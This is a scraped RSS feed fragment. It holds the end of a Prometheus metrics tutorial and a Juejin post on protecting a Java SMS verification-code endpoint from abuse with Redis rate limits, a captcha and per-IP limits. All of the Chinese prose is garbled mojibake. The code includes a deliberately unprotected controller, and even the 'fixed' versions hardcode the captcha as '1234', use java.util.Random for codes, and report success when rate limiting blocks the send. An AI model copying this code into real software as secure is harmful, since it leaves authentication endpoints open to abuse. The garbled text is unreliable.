<li>å¦‚ä½•é¿å…å¸¸è§çš„å‘ï¼Ÿ</li>
</ul>
<p>è®©æˆ‘ä»¬ç»§ç»­ä¸‹ä¸€ç¯‡ï¼Œä»¥ node-exporter ä¸ºä¾‹ï¼Œæ·±å…¥å­¦ä¹ ç›‘æ§æŒ‡æ ‡çš„è®¾è®¡è‰ºæœ¯ã€‚</p>
<p><strong>ä¸‹ä¸€ç¯‡ï¼šã€ŠPrometheus Exporter è®¾è®¡å®æˆ˜ â€”â€” node-exporter æºç è§£æä¸ Grafana é›†æˆã€‹</strong></p>
<hr/>
<h2 data-id="heading-25">é™„å½•ï¼šå››ç§ç±»å‹é€ŸæŸ¥è¡¨</h2>








































<table><thead><tr><th>ç±»å‹</th><th>ç”¨é€”</th><th>åªå¢ä¸å‡</th><th>å…¸å‹åœºæ™¯</th><th>å¸¸ç”¨å‡½æ•°</th></tr></thead><tbody><tr><td>Counter</td><td>ç´¯è®¡æ¬¡æ•°</td><td>æ˜¯</td><td>è¯·æ±‚æ•°ã€é”™è¯¯æ•°ã€æŸ¥è¯¢æ•°</td><td>rate(), increase()</td></tr><tr><td>Gauge</td><td>å½“å‰çŠ¶æ€</td><td>å¦</td><td>CPUã€å†…å­˜ã€è¿æ¥æ•°ã€é˜Ÿåˆ—é•¿åº¦</td><td>ç›´æ¥è¯»ã€delta()</td></tr><tr><td>Histogram</td><td>åˆ†å¸ƒç»Ÿè®¡</td><td>æ˜¯(bucket)</td><td>API å“åº”æ—¶é—´ã€è¯·æ±‚å¤§å°</td><td>histogram_quantile()</td></tr><tr><td>Summary</td><td>é¢„è®¡ç®—åˆ†ä½æ•°</td><td>æ˜¯(count)</td><td>GC æ—¶é—´ï¼ˆå•å®ä¾‹ï¼‰</td><td>ç›´æ¥è¯» {quantile}</td></tr></tbody></table>
<p><strong>é€‰æ‹©å†³ç­–æ ‘</strong></p>
<pre><code class="hljs language-css" lang="css">ä½ çš„é—®é¢˜æ˜¯ä»€ä¹ˆï¼Ÿ
â”œâ”€ å‘ç”Ÿäº†å¤šå°‘æ¬¡ï¼Ÿ â†’ Counter
â”œâ”€ ç°åœ¨æ˜¯å¤šå°‘ï¼Ÿ â†’ Gauge
â””â”€ åˆ†å¸ƒå¦‚ä½•ï¼ˆæœ‰æ²¡æœ‰é•¿å°¾ï¼‰ï¼Ÿ
   â”œâ”€ å¤šå®ä¾‹éœ€è¦èšåˆ â†’ Histogram
   â””â”€ å•å®ä¾‹ â†’ <span class="hljs-selector-tag">Summary</span> æˆ– Histogram
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é˜²æ­¢çŸ­ä¿¡éªŒè¯ç æ¥å£è¢«ç›—åˆ·é—®é¢˜]]></title>    <link>https://juejin.cn/post/7588733783571349542</link>    <guid>https://juejin.cn/post/7588733783571349542</guid>    <pubDate>2025-12-29T03:27:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588733783571349542" data-draft-id="7588733783571267622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é˜²æ­¢çŸ­ä¿¡éªŒè¯ç æ¥å£è¢«ç›—åˆ·é—®é¢˜"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-29T03:27:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="uup"/> <meta itemprop="url" content="https://juejin.cn/user/4378706456356627"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é˜²æ­¢çŸ­ä¿¡éªŒè¯ç æ¥å£è¢«ç›—åˆ·é—®é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4378706456356627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    uup
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T03:27:57.000Z" title="Mon Dec 29 2025 03:27:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Bug åœºæ™¯</h2>
<p>åœ¨ä¸€ä¸ªåŸºäº Java çš„ Web åº”ç”¨ä¸­ï¼Œç”¨æˆ·æ³¨å†Œæˆ–æ‰¾å›å¯†ç ç­‰åŠŸèƒ½ä¾èµ–çŸ­ä¿¡éªŒè¯ç è¿›è¡Œèº«ä»½éªŒè¯ã€‚ç„¶è€Œï¼Œè¿‘æœŸå‘ç°çŸ­ä¿¡éªŒè¯ç æ¥å£è¢«æ¶æ„ç”¨æˆ·é¢‘ç¹è°ƒç”¨ï¼Œå¯¼è‡´å¤§é‡çŸ­ä¿¡è¢«å‘é€ï¼Œä¸ä»…å¢åŠ äº†è¿è¥æˆæœ¬ï¼Œè¿˜å½±å“äº†æ­£å¸¸ç”¨æˆ·çš„ä½¿ç”¨ä½“éªŒï¼Œç”šè‡³å¯èƒ½å› è§¦å‘è¿è¥å•†çŸ­ä¿¡å‘é€é™åˆ¶è€Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚</p>
<h2 data-id="heading-1">äºŒã€ä»£ç ç¤ºä¾‹</h2>
<h3 data-id="heading-2">çŸ­ä¿¡å‘é€æœåŠ¡ç±»ï¼ˆæœ‰ç¼ºé™·ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsService</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendSms</span><span class="hljs-params">(String phoneNumber)</span> {
        <span class="hljs-comment">// ç”Ÿæˆ 6 ä½éšæœºéªŒè¯ç </span>
        <span class="hljs-type">int</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">900000</span>) + <span class="hljs-number">100000</span>;
        System.out.println(<span class="hljs-string">"å‘ "</span> + phoneNumber + <span class="hljs-string">" å‘é€çŸ­ä¿¡éªŒè¯ç : "</span> + code);
        <span class="hljs-comment">// å®é™…åº”ç”¨ä¸­åº”è°ƒç”¨çŸ­ä¿¡å‘é€ API å‘é€éªŒè¯ç </span>
    }
}
</code></pre>
<h3 data-id="heading-3">çŸ­ä¿¡éªŒè¯ç æ¥å£æ§åˆ¶å™¨ï¼ˆæœ‰ç¼ºé™·ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsVerificationCodeController</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">SmsService</span> <span class="hljs-variable">smsService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsService</span>();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendVerificationCode</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">phoneNumber</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"phoneNumber"</span>);
        <span class="hljs-keyword">if</span> (phoneNumber != <span class="hljs-literal">null</span>) {
            smsService.sendSms(phoneNumber);
            response.getWriter().println(<span class="hljs-string">"çŸ­ä¿¡éªŒè¯ç å·²å‘é€"</span>);
        } <span class="hljs-keyword">else</span> {
            response.getWriter().println(<span class="hljs-string">"æ‰‹æœºå·ä¸èƒ½ä¸ºç©º"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-4">ä¸‰ã€é—®é¢˜æè¿°</h2>
<ol>
<li><strong>é¢„æœŸè¡Œä¸º</strong>ï¼šæ­£å¸¸ç”¨æˆ·åœ¨éœ€è¦æ—¶èƒ½å¤Ÿè·å–çŸ­ä¿¡éªŒè¯ç ï¼Œä¸”æ¶æ„ç”¨æˆ·æ— æ³•é€šè¿‡é¢‘ç¹è°ƒç”¨æ¥å£æ¥ç›—åˆ·çŸ­ä¿¡éªŒè¯ç ï¼Œç¡®ä¿çŸ­ä¿¡å‘é€èµ„æºåˆç†ä½¿ç”¨ï¼ŒæœåŠ¡ç¨³å®šè¿è¡Œã€‚</li>
<li><strong>å®é™…è¡Œä¸º</strong>ï¼šæ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡ç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬ï¼Œä¸æ–­è°ƒç”¨çŸ­ä¿¡éªŒè¯ç æ¥å£ï¼Œå¯¼è‡´å¤§é‡ä¸å¿…è¦çš„çŸ­ä¿¡è¢«å‘é€ã€‚è¿™æ˜¯å› ä¸ºå½“å‰æ¥å£æ²¡æœ‰ä»»ä½•é™åˆ¶æœºåˆ¶ï¼Œæ— è®ºæ˜¯æ­£å¸¸ç”¨æˆ·è¿˜æ˜¯æ¶æ„ç”¨æˆ·ï¼Œåªè¦æä¾›äº†æ‰‹æœºå·ï¼Œå°±å¯ä»¥æ— é™åˆ¶åœ°è·å–çŸ­ä¿¡éªŒè¯ç ã€‚</li>
</ol>
<h2 data-id="heading-5">å››ã€è§£å†³æ–¹æ¡ˆ</h2>
<ol>
<li><strong>å¢åŠ é¢‘ç‡é™åˆ¶</strong>ï¼šé€šè¿‡è®°å½•ç”¨æˆ·è¯·æ±‚é¢‘ç‡ï¼Œé™åˆ¶åŒä¸€æ‰‹æœºå·åœ¨ä¸€å®šæ—¶é—´å†…çš„çŸ­ä¿¡å‘é€æ¬¡æ•°ã€‚å¯ä»¥ä½¿ç”¨ Redis æ¥å­˜å‚¨æ‰‹æœºå·çš„å‘é€è®°å½•å’Œæ—¶é—´æˆ³ã€‚</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> redis.clients.jedis.Jedis;
<span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_SENDS_PER_MINUTE</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">// æ¯åˆ†é’Ÿæœ€å¤šå‘é€ 3 æ¬¡</span>
    <span class="hljs-keyword">private</span> Jedis jedis;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsService</span><span class="hljs-params">(Jedis jedis)</span> {
        <span class="hljs-built_in">this</span>.jedis = jedis;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canSendSms</span><span class="hljs-params">(String phoneNumber)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"sms:limit:"</span> + phoneNumber;
        <span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> jedis.incr(key);
        <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {
            jedis.expire(key, <span class="hljs-number">60</span>); <span class="hljs-comment">// è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º 1 åˆ†é’Ÿ</span>
        }
        <span class="hljs-keyword">return</span> count &lt;= MAX_SENDS_PER_MINUTE;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendSms</span><span class="hljs-params">(String phoneNumber)</span> {
        <span class="hljs-keyword">if</span> (canSendSms(phoneNumber)) {
            <span class="hljs-type">int</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">900000</span>) + <span class="hljs-number">100000</span>;
            System.out.println(<span class="hljs-string">"å‘ "</span> + phoneNumber + <span class="hljs-string">" å‘é€çŸ­ä¿¡éªŒè¯ç : "</span> + code);
            <span class="hljs-comment">// å®é™…åº”ç”¨ä¸­åº”è°ƒç”¨çŸ­ä¿¡å‘é€ API å‘é€éªŒè¯ç </span>
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"å‘é€é¢‘ç‡è¿‡é«˜ï¼Œè¯·ç¨åå†è¯•"</span>);
        }
    }
}
</code></pre>
<h3 data-id="heading-6">ä¿®æ”¹åçš„çŸ­ä¿¡éªŒè¯ç æ¥å£æ§åˆ¶å™¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> redis.clients.jedis.Jedis;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsVerificationCodeController</span> {
    <span class="hljs-keyword">private</span> SmsService smsService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsVerificationCodeController</span><span class="hljs-params">(Jedis jedis)</span> {
        <span class="hljs-built_in">this</span>.smsService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsService</span>(jedis);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendVerificationCode</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">phoneNumber</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"phoneNumber"</span>);
        <span class="hljs-keyword">if</span> (phoneNumber != <span class="hljs-literal">null</span>) {
            smsService.sendSms(phoneNumber);
            response.getWriter().println(<span class="hljs-string">"çŸ­ä¿¡éªŒè¯ç å·²å‘é€"</span>);
        } <span class="hljs-keyword">else</span> {
            response.getWriter().println(<span class="hljs-string">"æ‰‹æœºå·ä¸èƒ½ä¸ºç©º"</span>);
        }
    }
}
</code></pre>
<ol start="2">
<li><strong>ä½¿ç”¨å›¾å½¢éªŒè¯ç </strong>ï¼šåœ¨å‘é€çŸ­ä¿¡éªŒè¯ç ä¹‹å‰ï¼Œè¦æ±‚ç”¨æˆ·å…ˆè¾“å…¥å›¾å½¢éªŒè¯ç ã€‚ç”¨æˆ·åªæœ‰æ­£ç¡®è¾“å…¥å›¾å½¢éªŒè¯ç åï¼Œæ‰èƒ½è¯·æ±‚çŸ­ä¿¡éªŒè¯ç ï¼Œå¢åŠ æ¶æ„è°ƒç”¨çš„éš¾åº¦ã€‚</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å›¾å½¢éªŒè¯ç ç”Ÿæˆå’ŒéªŒè¯é€»è¾‘ï¼ˆç¤ºä¾‹ä»£ç ï¼Œå®é™…éœ€æ›´å®Œå–„å®ç°ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CaptchaService</span> {
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateCaptcha</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç”Ÿæˆå›¾å½¢éªŒè¯ç çš„é€»è¾‘ï¼Œè¿”å›éªŒè¯ç å­—ç¬¦ä¸²</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"1234"</span>;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verifyCaptcha</span><span class="hljs-params">(String inputCaptcha, String storedCaptcha)</span> {
        <span class="hljs-keyword">return</span> inputCaptcha.equals(storedCaptcha);
    }
}
</code></pre>
<h3 data-id="heading-7">å†æ¬¡ä¿®æ”¹åçš„çŸ­ä¿¡éªŒè¯ç æ¥å£æ§åˆ¶å™¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> redis.clients.jedis.Jedis;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsVerificationCodeController</span> {
    <span class="hljs-keyword">private</span> SmsService smsService;
    <span class="hljs-keyword">private</span> CaptchaService captchaService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsVerificationCodeController</span><span class="hljs-params">(Jedis jedis)</span> {
        <span class="hljs-built_in">this</span>.smsService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsService</span>(jedis);
        <span class="hljs-built_in">this</span>.captchaService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaptchaService</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendVerificationCode</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">phoneNumber</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"phoneNumber"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">inputCaptcha</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"captcha"</span>);
        <span class="hljs-keyword">if</span> (phoneNumber != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">String</span> <span class="hljs-variable">storedCaptcha</span> <span class="hljs-operator">=</span> <span class="hljs-string">"1234"</span>; <span class="hljs-comment">// å®é™…åº”ç”¨ä¸­åº”ä» session æˆ–å…¶ä»–å­˜å‚¨ä¸­è·å–</span>
            <span class="hljs-keyword">if</span> (captchaService.verifyCaptcha(inputCaptcha, storedCaptcha)) {
                smsService.sendSms(phoneNumber);
                response.getWriter().println(<span class="hljs-string">"çŸ­ä¿¡éªŒè¯ç å·²å‘é€"</span>);
            } <span class="hljs-keyword">else</span> {
                response.getWriter().println(<span class="hljs-string">"å›¾å½¢éªŒè¯ç é”™è¯¯"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            response.getWriter().println(<span class="hljs-string">"æ‰‹æœºå·ä¸èƒ½ä¸ºç©º"</span>);
        }
    }
}
</code></pre>
<ol start="3">
<li><strong>IP è®¿é—®é™åˆ¶</strong>ï¼šè®°å½•è¯·æ±‚çš„ IP åœ°å€ï¼Œé™åˆ¶åŒä¸€ IP åœ¨ä¸€å®šæ—¶é—´å†…å¯¹çŸ­ä¿¡éªŒè¯ç æ¥å£çš„è®¿é—®æ¬¡æ•°ã€‚åŒæ ·å¯ä»¥ä½¿ç”¨ Redis æ¥å®ç°ã€‚</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> redis.clients.jedis.Jedis;
<span class="hljs-keyword">import</span> java.util.Random;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_REQUESTS_PER_IP_PER_MINUTE</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">// æ¯åˆ†é’Ÿæ¯ä¸ª IP æœ€å¤šè¯·æ±‚ 10 æ¬¡</span>
    <span class="hljs-keyword">private</span> Jedis jedis;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsService</span><span class="hljs-params">(Jedis jedis)</span> {
        <span class="hljs-built_in">this</span>.jedis = jedis;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">canSendSmsFromIp</span><span class="hljs-params">(String ip)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"sms:ip:limit:"</span> + ip;
        <span class="hljs-type">Long</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> jedis.incr(key);
        <span class="hljs-keyword">if</span> (count == <span class="hljs-number">1</span>) {
            jedis.expire(key, <span class="hljs-number">60</span>); <span class="hljs-comment">// è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º 1 åˆ†é’Ÿ</span>
        }
        <span class="hljs-keyword">return</span> count &lt;= MAX_REQUESTS_PER_IP_PER_MINUTE;
    }

    <span class="hljs-comment">// å…¶ä»–æ–¹æ³•ä¸å˜</span>
}
</code></pre>
<h3 data-id="heading-8">æœ€ç»ˆä¿®æ”¹åçš„çŸ­ä¿¡éªŒè¯ç æ¥å£æ§åˆ¶å™¨</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> redis.clients.jedis.Jedis;
<span class="hljs-keyword">import</span> java.io.IOException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsVerificationCodeController</span> {
    <span class="hljs-keyword">private</span> SmsService smsService;
    <span class="hljs-keyword">private</span> CaptchaService captchaService;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsVerificationCodeController</span><span class="hljs-params">(Jedis jedis)</span> {
        <span class="hljs-built_in">this</span>.smsService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsService</span>(jedis);
        <span class="hljs-built_in">this</span>.captchaService = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaptchaService</span>();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendVerificationCode</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">String</span> <span class="hljs-variable">phoneNumber</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"phoneNumber"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">inputCaptcha</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">"captcha"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">clientIp</span> <span class="hljs-operator">=</span> request.getRemoteAddr();

        <span class="hljs-keyword">if</span> (phoneNumber != <span class="hljs-literal">null</span>) {
            <span class="hljs-type">String</span> <span class="hljs-variable">storedCaptcha</span> <span class="hljs-operator">=</span> <span class="hljs-string">"1234"</span>; <span class="hljs-comment">// å®é™…åº”ç”¨ä¸­åº”ä» session æˆ–å…¶ä»–å­˜å‚¨ä¸­è·å–</span>
            <span class="hljs-keyword">if</span> (captchaService.verifyCaptcha(inputCaptcha, storedCaptcha) &amp;&amp; smsService.canSendSmsFromIp(clientIp)) {
                smsService.sendSms(phoneNumber);
                response.getWriter().println(<span class="hljs-string">"çŸ­ä¿¡éªŒè¯ç å·²å‘é€"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!captchaService.verifyCaptcha(inputCaptcha, storedCaptcha)) {
                response.getWriter().println(<span class="hljs-string">"å›¾å½¢éªŒè¯ç é”™è¯¯"</span>);
            } <span class="hljs-keyword">else</span> {
                response.getWriter().println(<span class="hljs-string">"è¯·æ±‚é¢‘ç‡è¿‡é«˜ï¼Œè¯·ç¨åå†è¯•"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            response.getWriter().println(<span class="hljs-string">"æ‰‹æœºå·ä¸èƒ½ä¸ºç©º"</span>);
        }
    }
}
